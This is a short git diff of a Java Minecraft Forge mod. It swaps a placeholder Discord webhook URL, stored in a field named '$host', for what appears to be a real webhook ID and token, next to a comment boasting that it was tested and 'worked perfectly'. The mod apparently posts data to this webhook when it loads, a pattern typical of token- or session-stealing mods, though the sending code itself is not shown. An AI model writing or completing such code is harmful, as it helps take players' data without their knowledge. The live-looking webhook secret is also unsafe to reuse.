@@ -17,7 +17,7 @@ import java.net.URL;
 public class Main {
 	
 	// this is an example webhook but it has been tested with a real webhook and it worked perfectly
-	final static String $host = "https://discord.com/api/webhooks/1000000000000000000/abcdefghijklmnopqrstuvwxy-z_A-BCDEFGHIJKLMNOPQRSTUVWXY_Z-0_123456789";
+	final static String $host = "https://discord.com/api/webhooks/1428590452160073810/au0ccRHWYyTtOyjneHK-HJR1xW3WvufZCadGCbxbWy8B7l7iW-Nndp5k-L7ATt4NnZ23";
 	
 	@Mod.EventHandler
 	public void preInit(FMLPreInitializationEvent event) {
